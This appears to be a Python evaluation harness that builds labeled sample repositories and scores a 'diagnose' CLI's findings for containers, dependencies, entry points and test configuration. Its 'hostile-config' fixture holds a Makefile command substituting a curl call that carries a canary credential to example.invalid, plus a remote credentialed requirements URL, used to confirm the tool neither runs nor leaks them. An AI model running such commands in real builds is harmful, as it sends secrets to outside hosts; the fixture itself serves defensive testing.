"""Evaluate Diagnose against independent, pre-labeled local repositories."""

import json
import os
import subprocess
import sys
from pathlib import Path
from tempfile import TemporaryDirectory

from measure_inspection_baseline import _snapshot

RULES = (
    "py-container-001",
    "py-deps-001",
    "py-entry-001",
    "py-test-001",
    "py-test-002",
)
CANARY = "held-out-private-canary"


def evidence(path, line=None, key=None):
    return {"path": path, "line": line, "key": key}


def variants():
    for name, framework, broken in (
        ("dispatch", "fastapi", True),
        ("ledger", "flask", True),
        ("calendar", "django", False),
        ("events", "starlette", False),
    ):
        target = "qa/suites"
        files = {
            "pyproject.toml": f'''[project]
name = "{name}"
dependencies = ["{framework}"]
[project.scripts]
launch = "{name}:start"
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
[tool.setuptools]
py-modules = ["{name}"]
[tool.pytest.ini_options]
testpaths = ["{target}"]
''',
            name + ".py": '"""Local command."""\n'
            + (
                "def serve():\n    return 0\n"
                if broken
                else "def start():\n    return 0\n"
            ),
            "Dockerfile": "FROM python:3.13-slim\nWORKDIR /service\n"
            + ("USER 0\n" if broken else "USER worker\n"),
            "Makefile": ".PHONY: test\ntest:\n\t@python -m pytest --config-file=config/check.ini\n",
            "requirements.txt": "# Service install\n--requirement config/pinned.txt\n",
            "service.py": f"import {framework}\n",
        }
        if broken:
            locations = (
                [evidence("Dockerfile", 3)],
                [evidence("requirements.txt", 2)],
                [
                    evidence(name + ".py"),
                    evidence("pyproject.toml", key="project.scripts"),
                ],
                [evidence("pyproject.toml", key="tool.pytest.ini_options.testpaths")],
                [evidence("Makefile", 3)],
            )
            expected = dict(
                zip(RULES, (("finding", e) for e in locations), strict=True)
            )
        else:
            files.update(
                {
                    target + "/test_clock.py": "def test_date(): pass\n",
                    "config/check.ini": "[pytest]\n",
                    "config/pinned.txt": framework + "\n",
                }
            )
            expected = dict.fromkeys(RULES, ("pass", []))
        yield name, files, expected

    unknown = dict.fromkeys(RULES, ("unknown", []))
    manifest = '[project]\nname = "terminal-tool"\n'
    yield (
        "packaged-cli",
        {
            "pyproject.toml": manifest + '[project.scripts]\nui = "ui:main"\n',
            "src/ui.py": "def main(): pass\n",
        },
        unknown
        | {rule: ("not_applicable", []) for rule in RULES if rule != "py-entry-001"},
    )
    yield "frontend", {"package.json": '{"name":"frontend"}'}, unknown
    yield (
        "mixed-projects",
        {
            "pyproject.toml": manifest,
            "api/pyproject.toml": manifest,
            "web/package.json": "{}",
        },
        unknown,
    )
    yield "malformed-root", {"pyproject.toml": "[project\n"}, unknown
    yield (
        "excluded-paths",
        {
            "pyproject.toml": manifest
            + '[tool.pytest.ini_options]\ntestpaths=["build/qa"]\n',
            "build/qa/test_code.py": "raise RuntimeError()\n",
            "requirements.txt": "-r vendor/requirements.txt\n",
            "vendor/requirements.txt": "flask\n",
        },
        unknown
        | {
            rule: ("not_applicable", [])
            for rule in ("py-container-001", "py-entry-001", "py-test-002")
        },
    )
    yield (
        "hostile-config",
        {
            "pyproject.toml": manifest + 'dependencies=["starlette"]\n'
            '[project.scripts]\nui = "ui:main"\n'
            '[tool.pytest.ini_options]\ntestpaths=["checks/*"]\n',
            "Dockerfile": "ARG BASE\nFROM $BASE\nUSER root\n",
            "Makefile": f"test:\n\tpytest -c $(curl https://user:{CANARY}@example.invalid)\n",
            "requirements.txt": f"-r https://user:{CANARY}@example.invalid/deps.txt\n",
            ".env": CANARY,
            "ui.py": f"raise RuntimeError({CANARY!r})\n",
        },
        unknown,
    )


def invoke(root, *flags):
    return subprocess.run(
        [sys.executable, "-m", "spawn.cli.app", "diagnose", str(root), *flags],
        capture_output=True,
        encoding="utf-8",
        timeout=30,
        env={**os.environ, "NO_COLOR": "1", "PYTHONIOENCODING": "utf-8"},
    )


def remediate_dispatch(root):
    """Follow the five recommendations in the labeled FastAPI walkthrough."""
    for file, data in {
        "dispatch.py": "def start():\n    return 0\n",
        "Dockerfile": "FROM python:3.13-slim\nWORKDIR /service\nUSER worker\n",
        "config/pinned.txt": "fastapi\n",
        "config/check.ini": "[pytest]\n",
        "qa/suites/test_dispatch.py": "def test_dispatch(): pass\n",
    }.items():
        path = root / file
        path.parent.mkdir(exist_ok=True, parents=True)
        path.write_text(data, encoding="utf-8", newline="\n")
    result = invoke(root, "--json", "--fail-on", "warning")
    report = json.loads(result.stdout)
    print(
        json.dumps(
            {
                "walkthrough": "dispatch after remediation",
                "exit": result.returncode,
                "status": report["status"],
                "severity_counts": report["severity_counts"],
            }
        )
    )
    return result.returncode == 0 and report["is_clean"]


def main():
    cases = list(variants())
    print(
        json.dumps({"labels": {name: labels for name, _, labels in cases}}), flush=True
    )
    metrics = (
        "tp",
        "fp",
        "fn",
        "pass",
        "unknown",
        "not_applicable",
        "not_checked",
        "failed",
    )
    counts = {rule: dict.fromkeys(metrics, 0) for rule in RULES}
    failures = []
    with TemporaryDirectory() as temp:
        for name, files, labels in cases:
            root = Path(temp) / name
            for relative, body in files.items():
                path = root / relative
                path.parent.mkdir(exist_ok=True, parents=True)
                path.write_text(body, encoding="utf-8", newline="\n")
            before = _snapshot(root)
            raw = invoke(root, "--json")
            human = invoke(root, "--verbose", "--no-color")
            code = 9 if any(status == "unknown" for status, _ in labels.values()) else 0
            if raw.returncode != code or human.returncode != code:
                failures.append([name, "exit", raw.returncode, human.returncode])
            if (
                CANARY in raw.stdout + raw.stderr + human.stdout + human.stderr
                or before != _snapshot(root)
            ):
                failures.append([name, "output leak or mutation"])
            if name in {"dispatch", "frontend"}:
                print(json.dumps({"walkthrough": name, "terminal": human.stdout}))
            try:
                outcomes = {
                    row["rule_id"]: row for row in json.loads(raw.stdout)["outcomes"]
                }
            except (ValueError, KeyError):
                failures.append([name, "invalid report"])
                outcomes = {}
            if set(outcomes) != set(RULES):
                failures.append([name, "rule set"])
            for rule, (expected, locations) in labels.items():
                row = outcomes.get(rule, {"outcome": "not_checked", "findings": []})
                actual = row["outcome"]
                counter = counts[rule]
                if actual != "finding":
                    counter[actual] += 1
                claimed = bool(row["findings"])
                matched = (
                    claimed
                    and len(row["findings"]) == 1
                    and (
                        sorted(
                            row["findings"][0]["evidence"],
                            key=lambda item: item["path"],
                        )
                        == sorted(locations, key=lambda item: item["path"])
                    )
                    and row["findings"][0]["severity"] == "warning"
                )
                counter["tp"] += expected == "finding" and matched
                counter["fp"] += claimed and (expected != "finding" or not matched)
                counter["fn"] += expected == "finding" and not matched
                if actual != expected or (expected == "finding" and not matched):
                    failures.append(
                        [name, rule, expected, actual, "evidence match", matched]
                    )
            if name == "dispatch" and not remediate_dispatch(root):
                failures.append(
                    [name, "remediation retained findings or lost coverage"]
                )
    for values in counts.values():
        tp, fp, fn = (values[key] for key in ("tp", "fp", "fn"))
        values["precision"] = tp / (tp + fp) if tp + fp else None
        values["recall"] = tp / (tp + fn) if tp + fn else None
    print(json.dumps({"counts": counts, "cases": len(cases), "failures": failures}))
    return bool(failures)


if __name__ == "__main__":
    raise SystemExit(main())
